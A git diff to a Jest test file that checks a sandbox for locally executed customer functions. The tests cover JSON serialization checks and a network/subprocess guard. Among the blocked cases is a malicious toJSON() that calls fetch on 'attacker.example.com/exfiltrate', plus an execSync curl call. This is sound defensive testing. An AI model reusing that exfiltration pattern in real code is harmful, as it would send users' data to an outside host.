@@ -18,6 +18,7 @@ import {
     deriveActionTimeouts,
     executeScriptLocally as executeScriptLocallyWithRuntimeContext,
 } from './local-execution';
+import { forceReset } from './network-guard';
 
 const func: BackendFunction = {
     relativePath: 'src/example',
@@ -87,12 +88,35 @@ function executeScriptLocally(
     );
 }
 
+// Same reasoning as network-guard.test.ts's own afterEach.
+afterEach(() => {
+    forceReset();
+});
+
 /** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
 function loadModuleReturning(exports: Record<string, unknown>): LoadModule {
     return moduleResolverFor(func, exports);
 }
 
 const ORDER_MARKER = '__ddLocalExecutionTestOrder';
+
+// `(globalThis as { fetch: typeof fetch }).fetch = impl` repeated verbatim at every mock/restore
+// call site — this collapses the cast to one place.
+function setGlobalFetch(impl: typeof fetch): void {
+    (globalThis as { fetch: typeof fetch }).fetch = impl;
+}
+
+// `getNetworkGuard()`'s lazy `import('./network-guard')` (see local-execution.ts) defers
+// network-guard.ts's module-load-time side effects (process-wide monkeypatches on net.Socket,
+// fetch, dgram, dns, child_process, worker_threads.Worker) until local execution actually runs,
+// instead of installing them the moment any bundler transitively imports this file via index.ts.
+// Not unit-testable under Jest: ts-jest doesn't route TypeScript-compiled modules through Node's
+// native `require.cache`, so inspecting it can't distinguish an eagerly- from a lazily-loaded
+// module here. Verified instead by bundling this file with esbuild (matching what a real
+// non-Vite consumer of the apps plugin actually does) and confirming the compiled output wraps
+// `getNetworkGuard`'s call in `Promise.resolve().then(() => init_network_guard())` — esbuild's
+// standard lazy-CJS-module pattern — rather than requiring network-guard.ts eagerly at the top
+// of the bundle.
 
 describe('local-execution — executeScriptLocally', () => {
     test('Should run a simple function in-process and return its result', async () => {
@@ -442,8 +466,66 @@ describe('local-execution — executeScriptLocally', () => {
         ).rejects.toThrow(/must have an inputs field/);
     });
 
-    test('Should currently accept an array as inputs without a validation error, since typeof [] === "object"', async () => {
-        // Documents a known, accepted gap: inputs is semantically a plain object of named parameters, but validateActionCall's `typeof inputs !== 'object'` check also passes an array through unchanged.
+    // validateActionCall's own `typeof inputs !== 'object'` check passes an array through
+    // unchanged (typeof [] === 'object'), but serializeActionInputs's shape check downstream
+    // rejects it — inputs is semantically a plain object of named parameters, and a caller relying
+    // on `Record`-shaped inputs must never actually receive an array.
+    test('Should reject an array as inputs, since inputs is semantically a plain object of named parameters', async () => {
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({ inputs: ['a', 'b'] }),
+                }),
+                mockLogger,
+            ),
+        ).rejects.toThrow(/Inputs to action.*must be a plain object.*top-level shape to an array/);
+    });
+
+    test('Should reject a $.Actions call whose inputs contain a Map, instead of silently sending {} to the destination action', async () => {
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({
+                            inputs: { text: new Map([['a', 1]]) },
+                        }),
+                }),
+                mockLogger,
+            ),
+        ).rejects.toThrow(/Inputs to action.*silently flattens/);
+    });
+
+    test('Should reject a $.Actions call whose inputs contain NaN, instead of silently sending null to the destination action', async () => {
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({
+                            inputs: { score: NaN },
+                        }),
+                }),
+                mockLogger,
+            ),
+        ).rejects.toThrow(/Inputs to action.*silently converts to "null"/);
+    });
+
+    // Regression test: production's own JSON serialization of $.Actions inputs already silently
+    // omits an undefined-valued object property (e.g. `threadId: options?.threadId`) rather than
+    // erroring — a common optional-field pattern that must behave the same way locally.
+    test('Should silently omit an undefined-valued object property from $.Actions inputs, matching real JSON.stringify/production behavior', async () => {
         const executeAction = jest.fn().mockResolvedValue({ ok: true });
         const result = await executeScriptLocally(
             func,
@@ -451,16 +533,60 @@ describe('local-execution — executeScriptLocally', () => {
             [],
             executeAction,
             loadModuleReturning({
-                example: () => testDollar().Actions.slack.chat.postMessage({ inputs: ['a', 'b'] }),
+                example: () =>
+                    testDollar().Actions.slack.chat.postMessage({
+                        inputs: { text: 'hi', threadId: undefined },
+                    }),
             }),
             mockLogger,
         );
         expect(result).toEqual({ data: { ok: true } });
         expect(executeAction).toHaveBeenCalledWith(
             'com.datadoghq.slack.chat.postMessage',
-            ['a', 'b'],
+            { text: 'hi' },
             undefined,
         );
+    });
+
+    // Unlike an object property, JSON.stringify silently converts an array element's undefined to
+    // null instead of dropping it — real corruption, so this case still needs to be caught.
+    test('Should reject a $.Actions call whose inputs contain undefined inside an array, instead of silently sending null to the destination action', async () => {
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({
+                            inputs: { items: ['a', undefined, 'b'] },
+                        }),
+                }),
+                mockLogger,
+            ),
+        ).rejects.toThrow(/Inputs to action.*undefined inside an array.*silently converts to null/);
+    });
+
+    // A top-level toJSON() can change the round-tripped value's shape entirely (object -> string),
+    // which the JSON-corruption checks above don't catch — they validate what's inside the value,
+    // not what type the whole thing ends up being. Callers depend on getting a plain object back.
+    test('Should reject a $.Actions call whose inputs round-trip to something other than a plain object via a top-level toJSON()', async () => {
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({
+                            inputs: { toJSON: () => 'not an object' },
+                        }),
+                }),
+                mockLogger,
+            ),
+        ).rejects.toThrow(/Inputs to action.*must be a plain object.*top-level shape to string/);
     });
 
     test('Should reject with the thrown message when the customer function throws synchronously', async () => {
@@ -757,6 +883,56 @@ describe('local-execution — executeScriptLocally', () => {
                 50,
             ),
         ).rejects.toThrow(/timed out after 50ms/);
+    });
+
+    test("Should keep a hung function's own late continuation blocked after timeout, while a fresh execution afterward still works normally", async () => {
+        let lateNetworkAttempt: Promise<unknown> | undefined;
+
+        await expect(
+            executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        new Promise(() => {
+                            // Scheduled, not awaited, so `example` never settles and the race
+                            // below times out normally — fires after that 50ms timeout, not before.
+                            setTimeout(() => {
+                                lateNetworkAttempt = fetch('https://example.com');
+                                lateNetworkAttempt.catch(() => undefined);
+                            }, 100);
+                        }),
+                }),
+                mockLogger,
+                50,
+            ),
+        ).rejects.toThrow(/timed out after 50ms/);
+
+        // Lets the hung function's own delayed continuation fire, well after the timeout above.
+        await new Promise((resolve) => setTimeout(resolve, 100));
+
+        // The abandoned continuation's own async chain stays permanently blocked (by design), so
+        // its late network attempt must still be rejected — an identity check on the guarded
+        // property can't verify this, since the wrapper never changes identity either way.
+        expect(lateNetworkAttempt).toBeDefined();
+        await expect(lateNetworkAttempt).rejects.toThrow(/Network access is not allowed/);
+
+        // A fresh execution afterward must still work normally — the abandoned scope above must
+        // not permanently wedge network/action access for everything that runs after it.
+        const result = await executeScriptLocally(
+            func,
+            TEST_PROJECT_ROOT,
+            [],
+            stubExecuteAction,
+            loadModuleReturning({
+                example: () =>
+                    testDollar().Actions.slack.chat.postMessage({ inputs: { text: 'hi' } }),
+            }),
+            mockLogger,
+        );
+        expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
     });
 
     test('Should preserve preview context fields while overriding invocation-owned args and Actions', async () => {
@@ -1620,30 +1796,52 @@ describe('local-execution — executeScriptLocally', () => {
             ).rejects.toThrow(/example.*Symbol-keyed property/);
         });
 
-        test('Should reject an explicit undefined nested inside a plain object, not just at the top level', async () => {
+        // A pre-stringify scan of the original value would miss this: toJSON() only runs during
+        // JSON.stringify itself, so the symbol-keyed object it returns must be checked where the
+        // replacer actually sees it, not on the value returned from the customer function.
+        test('Should reject a Symbol-keyed property introduced only by a custom toJSON(), not present on the original value', async () => {
+            const secretSymbol = Symbol('secret');
             await expect(
                 executeScriptLocally(
                     func,
                     TEST_PROJECT_ROOT,
                     [],
                     stubExecuteAction,
-                    loadModuleReturning({ example: () => ({ status: 'ok', extra: undefined }) }),
+                    loadModuleReturning({
+                        example: () => ({
+                            status: 'ok',
+                            toJSON: () => ({ replaced: true, [secretSymbol]: 'leaked' }),
+                        }),
+                    }),
                     mockLogger,
                 ),
-            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
+            ).rejects.toThrow(/example.*Symbol-keyed property/);
         });
 
-        test('Should reject an explicit undefined at a property literally named the empty string, not mistake it for the JSON root', async () => {
-            await expect(
-                executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    stubExecuteAction,
-                    loadModuleReturning({ example: () => ({ '': undefined, other: 'ok' }) }),
-                    mockLogger,
-                ),
-            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
+        // Production's own HTTP serialization of a function's return value already silently omits
+        // an undefined-valued object property rather than erroring, so local execution must match.
+        test('Should silently omit an undefined nested inside a plain object from the return value, matching production, not just at the top level', async () => {
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => ({ status: 'ok', extra: undefined }) }),
+                mockLogger,
+            );
+            expect(result).toEqual({ data: { status: 'ok' } });
+        });
+
+        test('Should silently omit an undefined at a property literally named the empty string, not mistake it for the JSON root', async () => {
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => ({ '': undefined, other: 'ok' }) }),
+                mockLogger,
+            );
+            expect(result).toEqual({ data: { other: 'ok' } });
         });
 
         test('Should reject a function at a property literally named the empty string, not mistake it for the JSON root', async () => {
@@ -1669,7 +1867,22 @@ describe('local-execution — executeScriptLocally', () => {
                     loadModuleReturning({ example: () => [1, Symbol('unsupported')] }),
                     mockLogger,
                 ),
-            ).rejects.toThrow(/example.*JSON.stringify silently drops/);
+            ).rejects.toThrow(/example.*symbol inside an array.*silently converts to null/);
+        });
+
+        // Unlike an object property, JSON.stringify silently converts an array element's undefined
+        // to null instead of dropping it — real corruption, so this must still be caught.
+        test('Should reject an undefined nested inside an array of the return value, instead of silently sending null', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({ example: () => [1, undefined, 2] }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/example.*undefined inside an array.*silently converts to null/);
         });
 
         test('Should allow an explicit undefined result through unchanged', async () => {
@@ -1704,6 +1917,286 @@ describe('local-execution — executeScriptLocally', () => {
             );
             expect(result).toEqual({ data: { callNumber: 1 } });
             expect(toJsonCallCount).toBe(1);
+        });
+    });
+
+    describe('network/subprocess guard', () => {
+        test('Should reject when the customer function tries a raw net.Socket connection', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            // eslint-disable-next-line @typescript-eslint/no-require-imports
+                            const net = require('net');
+                            return new net.Socket().connect(80, 'example.com');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should reject when the customer function tries a raw fetch() call', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({ example: () => fetch('https://example.com') }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should reject when the customer function tries to spawn a subprocess', async () => {
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            // eslint-disable-next-line @typescript-eslint/no-require-imports
+                            const child_process = require('child_process');
+                            return child_process.execSync('curl https://example.com');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow(/Spawning a subprocess is not allowed/);
+        });
+
+        test('Should still let a real $.Actions call through while the rest of the function is network-blocked', async () => {
+            const executeAction = jest.fn().mockResolvedValue({ ok: true });
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                executeAction,
+                loadModuleReturning({
+                    example: async () => {
+                        const actionResult = await testDollar().Actions.slack.chat.postMessage({
+                            inputs: { text: 'hi' },
+                        });
+                        // A raw fetch right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call.
+                        await expect(fetch('https://example.com')).rejects.toThrow(
+                            /Network access is not allowed/,
+                        );
+                        return actionResult;
+                    },
+                }),
+                mockLogger,
+            );
+            expect(result).toEqual({ data: { ok: true } });
+            expect(executeAction).toHaveBeenCalledWith(
+                'com.datadoghq.slack.chat.postMessage',
+                { text: 'hi' },
+                undefined,
+            );
+        });
+
+        test('Should block a malicious toJSON() on $.Actions inputs from making a real network call under cover of the exemption', async () => {
+            // toJSON() must be synchronous, so its fetch attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
+            let fetchAttempt: Promise<unknown> | undefined;
+            const maliciousInputs = {
+                text: 'hi',
+                toJSON() {
+                    // Would resolve instead of rejecting if this ran inside runAllowed's window, meant only for the trusted preview-async call itself.
+                    fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                    return { text: 'hi' };
+                },
+            };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () =>
+                        testDollar().Actions.slack.chat.postMessage({
+                            inputs: maliciousInputs,
+                        }),
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
+            expect(fetchAttempt).toBeDefined();
+            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+        });
+
+        test('Should restore real network access after execution, for whatever the dev server itself does next', async () => {
+            const realFetch = globalThis.fetch;
+            await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => 'fine' }),
+                mockLogger,
+            );
+            expect(globalThis.fetch).toBe(realFetch);
+        });
+
+        test('Should keep network access allowed through two real, overlapping $.Actions calls made concurrently via Promise.all, without either blocking the other mid-flight', async () => {
+            // Proves the exemption holds through the real customer path (Promise.all → makeActionsProxy → runAllowed), not just at the unit level.
+            const order: string[] = [];
+            const executeAction: ExecuteAction = async (fqn) => {
+                const label = fqn.includes('slow') ? 'slow' : 'fast';
+                order.push(`${label}-start`);
+                if (label === 'slow') {
+                    await new Promise((r) => setTimeout(r, 20));
+                }
+                await fetch(`https://example.com/${label}`);
+                order.push(`${label}-end`);
+                return { ok: true, fqn };
+            };
+
+            const originalFetch = globalThis.fetch;
+            const fetchMock = jest.fn().mockResolvedValue('ok');
+            setGlobalFetch(fetchMock as unknown as typeof fetch);
+
+            let result: { data: unknown };
+            try {
+                result = await executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    executeAction,
+                    loadModuleReturning({
+                        example: () => {
+                            const $ = testDollar();
+                            return Promise.all([
+                                $.Actions.slow.action({ inputs: {} }),
+                                $.Actions.fast.action({ inputs: {} }),
+                            ]);
+                        },
+                    }),
+                    mockLogger,
+                );
+            } finally {
+                setGlobalFetch(originalFetch);
+            }
+
+            expect(result.data).toEqual([
+                { ok: true, fqn: 'com.datadoghq.slow.action' },
+                { ok: true, fqn: 'com.datadoghq.fast.action' },
+            ]);
+            // The slow call's own fetch, made after the fast call's allow scope exited, must still resolve — network stayed allowed for it the whole time.
+            expect(order).toEqual(['slow-start', 'fast-start', 'fast-end', 'slow-end']);
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/slow');
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/fast');
+        });
+
+        // The action-catalog callback must be exempted from the block like makeActionsProxy's apply trap — it runs from inside the blocked function.
+        test("Should let a real network call through an action-catalog typed-wrapper call, not block it as if it were the customer's own code", async () => {
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            const executeAction: ExecuteAction = async (fqn, inputs) => {
+                const response = await fetch('https://example.com/action-catalog');
+                return { fqn, inputs, response };
+            };
+
+            let registeredImpl:
+                | ((actionId: string, request: unknown) => Promise<unknown>)
+                | undefined;
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        example: async () =>
+                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
+                                inputs: { text: 'hi' },
+                            }),
+                    };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    return {
+                        setExecuteActionImplementation: (
+                            impl: (actionId: string, request: unknown) => Promise<unknown>,
+                        ) => {
+                            registeredImpl = impl;
+                        },
+                    };
+                }
+                const notFoundError: NodeJS.ErrnoException = new Error(
+                    `Cannot find module '${specifier}'`,
+                );
+                notFoundError.code = 'MODULE_NOT_FOUND';
+                throw notFoundError;
+            };
+
+            const originalFetch = globalThis.fetch;
+            const fetchMock = jest.fn().mockResolvedValue('ok');
+            setGlobalFetch(fetchMock as unknown as typeof fetch);
+
+            let result: { data: unknown };
+            try {
+                result = await executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    executeAction,
+                    loadModule,
+                    mockLogger,
+                );
+            } finally {
+                setGlobalFetch(originalFetch);
+            }
+
+            expect(result.data).toEqual({
+                fqn: 'com.datadoghq.slack.chat.postMessage',
+                inputs: { text: 'hi' },
+                response: 'ok',
+            });
+            expect(fetchMock).toHaveBeenCalledWith('https://example.com/action-catalog');
+        });
+    });
+
+    describe('loadCustomerModuleEntry', () => {
+        // Regression test: network-guard.ts's trustedStdout/trustedStderr are captured at that
+        // module's own load time (see network-guard.ts). If the customer module's top-level code
+        // ran first, it could repoint process.stdout before the guard ever captures it, permanently
+        // defeating the write-blocking exemption check for every later execution in the process.
+        // loadCustomerModuleEntry is the one choke point every caller (executeColdActionLocally's
+        // priming, runScriptLocally's own fallback) funnels through, so asserting order here covers
+        // every path. Isolates both modules fresh so the assertion isn't satisfied by network-guard
+        // already having loaded from an earlier test in this file.
+        test("Should await the network guard module before evaluating the customer module's top-level code", async () => {
+            const calls: string[] = [];
+
+            await jest.isolateModulesAsync(async () => {
+                jest.doMock('./network-guard', () => {
+                    calls.push('network-guard-loaded');
+                    return {
+                        runBlocked: async (fn: () => Promise<unknown>) => fn(),
+                        runAllowed: async (fn: () => Promise<unknown>) => fn(),
+                        forceReset: () => undefined,
+                    };
+                });
+
+                const {
+                    loadCustomerModuleEntry: isolatedLoadCustomerModuleEntry,
+                } = require('./local-execution');
+
+                const loadModule: LoadModule = async () => {
+                    calls.push('customer-module-loaded');
+                    return { example: () => 'done' };
+                };
+
+                const mod = await isolatedLoadCustomerModuleEntry(
+                    loadModule,
+                    func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX,
+                );
+                expect(mod).toEqual({ example: expect.any(Function) });
+            });
+
+            expect(calls).toEqual(['network-guard-loaded', 'customer-module-loaded']);
         });
     });
 
@@ -2369,6 +2862,55 @@ describe('local-execution — executeScriptLocally', () => {
             await new Promise((resolve) => setTimeout(resolve, 100));
 
             expect(callCount).toBe(0);
+        });
+
+        // An abandoned execution's loadModule can resolve late, after a newer one is already inside the guards — it must not corrupt the newer state.
+        test("Should never let an abandoned execution's late-resolving loadModule enter the network/env guards while a newer execution is still inside them", async () => {
+            const makeLoadModule = (mainDelayMs: number): LoadModule => {
+                return async (specifier: string) => {
+                    if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                        if (mainDelayMs > 0) {
+                            await new Promise((resolve) => setTimeout(resolve, mainDelayMs));
+                        }
+                        return {
+                            example: async () => {
+                                // B's own body: still running when A's slow loadModule resolves, so any state A corrupts on its way in would be visible here.
+                                await new Promise((resolve) => setTimeout(resolve, 200));
+                                return 'b-result';
+                            },
+                        };
+                    }
+                    const notFoundError: NodeJS.ErrnoException = new Error(
+                        `Cannot find module '${specifier}'`,
+                    );
+                    notFoundError.code = 'MODULE_NOT_FOUND';
+                    throw notFoundError;
+                };
+            };
+
+            // A times out at 20ms, well before its own 150ms-delayed loadModule resolves.
+            const abandoned = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                makeLoadModule(150),
+                mockLogger,
+                20,
+            );
+            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);
+
+            // B starts as soon as the queue frees, and is still running its own 200ms body when A's loadModule resolves at the ~150ms mark.
+            const second = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                makeLoadModule(0),
+                mockLogger,
+            );
+
+            await expect(second).resolves.toEqual({ data: 'b-result' });
         });
     });
 });
